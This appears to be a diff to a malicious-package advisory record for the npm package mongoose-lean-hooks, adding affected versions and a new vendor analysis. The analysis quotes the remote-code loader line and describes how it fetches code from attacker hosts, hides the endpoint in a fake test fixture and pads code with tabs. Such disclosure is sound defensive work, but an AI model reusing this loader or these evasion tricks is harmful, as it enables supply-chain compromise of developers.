@@ -1,5 +1,5 @@
 {
-  "modified": "2026-07-09T16:23:02Z",
+  "modified": "2026-07-09T17:21:23Z",
   "published": "2026-07-06T18:01:34Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-6797",
@@ -7,7 +7,7 @@
     "GHSA-98h3-p825-wwhh"
   ],
   "summary": "Malicious code in mongoose-lean-hooks (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (10d9262bdff06cb91509d2cc58964ae249c97f6e94bc790b42b637b015251adf)\nindex.js appends a hidden IIFE after `module.exports = leanhooksPlugin;`, padded with hundreds of tab characters to keep it off-screen in casual review. When any consumer require()s the package, the IIFE runs `axios.get('https://jsonkeeper.com/b/LZCY3')` and passes the returned `cookie` field to `new Function('require',...)`, then invokes the constructed function with the host's `require`. This gives the operator arbitrary code execution in the consumer's Node process with access to `require` (filesystem, network, environment variables). The advertised purpose is a small Mongoose timestamps plugin, but 0.5.5 also adds runtime dependencies (axios, sqlite3, request, defaults) that the plugin logic does not use — axios is present specifically to power the remote-exec loader. The payload host (jsonkeeper.com) is an anonymous, author-mutable paste service, so today's fetched code can be swapped for anything at any time without a package republish. Behavior shape is consistent with a hijack/malicious republish of a legacy package name.\n\n## Source: ghsa-malware (51f21ca8cb459221a26134e631f974e5a26cb292386a957c75da31b538119c61)\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (540ace1cb8bc936ea953554a9ffc28203370f82cb5e5a7dfbf1454bf0e834b9a)\nOn `require('mongoose-lean-hooks')`, the package's main entry (index.js) runs a top-level async IIFE that issues an HTTP GET to http://mongos-hooks-api.vercel.app/defy/v3 with a bearer-style header. When the response is a 404 carrying a `token` string field, that server-controlled string is passed to `Function.constructor` with `require` bound in and immediately invoked (`const handler = new (Function.constructor)(\"require\", res.token); handler(require);`), yielding arbitrary code execution in the consumer's Node process with full `require` access. The endpoint, path, and header token are hidden in test/config_test.js under a `module.exports` shaped like a benign test fixture and imported by the production entry — a deliberate evasion to make reviewers skim past the C2 configuration as test scaffolding. The package name and description mimic the legitimate mongoose plugin ecosystem (advertising createdAt/updatedAt timestamp functionality) to encourage installs. The plaintext HTTP destination and dynamic-payload design mean the attacker can change the delivered code at any time without republishing.\n\n## Source: ghsa-malware (51f21ca8cb459221a26134e631f974e5a26cb292386a957c75da31b538119c61)\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.\n",
   "affected": [
     {
       "package": {
@@ -28,10 +28,22 @@
         "0.5.3",
         "0.5.2",
         "0.5.4",
-        "0.5.5"
+        "0.5.5",
+        "0.5.7",
+        "0.5.6"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -82,6 +94,14 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/mongoose-lean-hooks/v/0.5.5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/mongoose-lean-hooks/v/0.5.7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/mongoose-lean-hooks/v/0.5.6"
     }
   ],
   "credits": [
@@ -145,6 +165,26 @@
         "modified_time": "2026-07-09T15:53:16Z",
         "versions": [
           "0.5.5"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "540ace1cb8bc936ea953554a9ffc28203370f82cb5e5a7dfbf1454bf0e834b9a",
+        "import_time": "2026-07-09T17:19:25.058781906Z",
+        "id": "IN-MAL-2026-009331",
+        "modified_time": "2026-07-09T16:56:58Z",
+        "versions": [
+          "0.5.7"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "01f4ee974d2eca27a4a78c0adf2bb538f399fa0a61fe17d889d7a0786ea12192",
+        "import_time": "2026-07-09T17:19:26.362152193Z",
+        "id": "IN-MAL-2026-009340",
+        "modified_time": "2026-07-09T16:58:15Z",
+        "versions": [
+          "0.5.6"
         ]
       }
     ]
